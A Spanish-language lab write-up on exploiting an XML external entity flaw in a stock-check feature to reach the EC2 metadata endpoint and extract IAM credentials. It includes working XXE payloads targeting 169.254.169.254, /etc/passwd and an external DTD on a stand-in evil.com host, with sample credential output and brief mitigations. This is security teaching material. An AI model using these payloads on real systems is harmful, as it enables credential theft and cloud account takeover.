# Exploiting XXE to Perform SSRF Attacks

## Introducción

Esta práctica de laboratorio explora cómo explotar una vulnerabilidad de **XXE (XML External Entity)** para realizar un **ataque SSRF (Server-Side Request Forgery)** y obtener credenciales de acceso desde el punto final de metadatos de una instancia EC2.

## Explicación del Ataque

La función "Verificar stock" del sitio web procesa datos en formato XML y devuelve respuestas que pueden incluir valores inesperados. El servidor está configurado con un **punto final de metadatos EC2** accesible en la URL `http://169.254.169.254/`. Este punto final proporciona información sobre la instancia, incluyendo credenciales IAM que pueden ser sensibles.

Nuestro objetivo es explotar la vulnerabilidad **XXE** para realizar un ataque **SSRF**, lo que nos permitirá acceder al punto final de metadatos y extraer información privilegiada.

## ¿Siempre se necesita el `&` antes de `xxe`?

Sí, cuando hacemos referencia a una entidad XML definida en un `DOCTYPE`, debemos utilizar `&xxe;` para que el parser XML interprete correctamente la entidad y la reemplace por su valor. Por ejemplo:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/admin"> ]>
<stockCheck>
    <productId>&xxe;</productId>
    <storeId>1</storeId>
</stockCheck>
```

Si omites `&`, el parser no reconocerá la entidad `xxe` y tratará el texto como un valor normal en XML, evitando la ejecución del ataque.

## ¿Siempre hay que apuntar a `xxe`?

No necesariamente. En el ataque XXE podemos apuntar a diferentes fuentes de información. Algunos ejemplos incluyen:

- **Archivos locales:**
    
    ```xml
    <!ENTITY xxe SYSTEM "file:///etc/passwd">
    ```
    
- **Puntos finales internos (SSRF):**
    
    ```xml
    <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">
    ```
    
- **Servidores externos:**
    
    ```xml
    <!ENTITY xxe SYSTEM "http://evil.com/malicious.dtd">
    ```
    

## Enumeración de Directorios en un Servidor Interno

Si la aplicación permite la enumeración de directorios, podemos listar información sensible del servidor de metadatos:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/"> ]>
<stockCheck>
    <productId>&xxe;</productId>
    <storeId>1</storeId>
</stockCheck>
```

Esto podría devolver información como:

```
ami-id
ami-launch-index
hostname
iam/
instance-id
instance-type
mac
network/
```

Con esta información, podemos profundizar más en la explotación.

## Explotación para Obtener Credenciales IAM

Para obtener credenciales IAM del servidor de metadatos EC2:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/admin"> ]>
<stockCheck>
    <productId>&xxe;</productId>
    <storeId>1</storeId>
</stockCheck>
```

Salida esperada:

```json
{
  "AccessKeyId": "D0gVNXv8UoUk7oK68X",
  "SecretAccessKey": "5LFY0rGLzaZGlqMw3GUAYfX0FZpweS0he0DT1k8E",
  "Token": "MiJfxrPm1w3BWphE8ATKJ9g8lRxOYU...
}
```

Con esta información, podemos autenticar llamadas API de AWS y potencialmente tomar control de la cuenta.

## Conclusión

Este laboratorio demuestra cómo una vulnerabilidad **XXE** puede ser explotada para realizar un ataque **SSRF**, obteniendo acceso a recursos internos y credenciales sensibles. La mitigación de este tipo de ataques incluye:

- Deshabilitar la carga de entidades externas en XML.
- Usar `whitelists` para limitar las solicitudes XML.
- Implementar validaciones estrictas de entrada.

Siempre es importante analizar cómo las aplicaciones web manejan los datos XML para evitar estos vectores de ataque.
![[Pasted image 20250128215953.png]]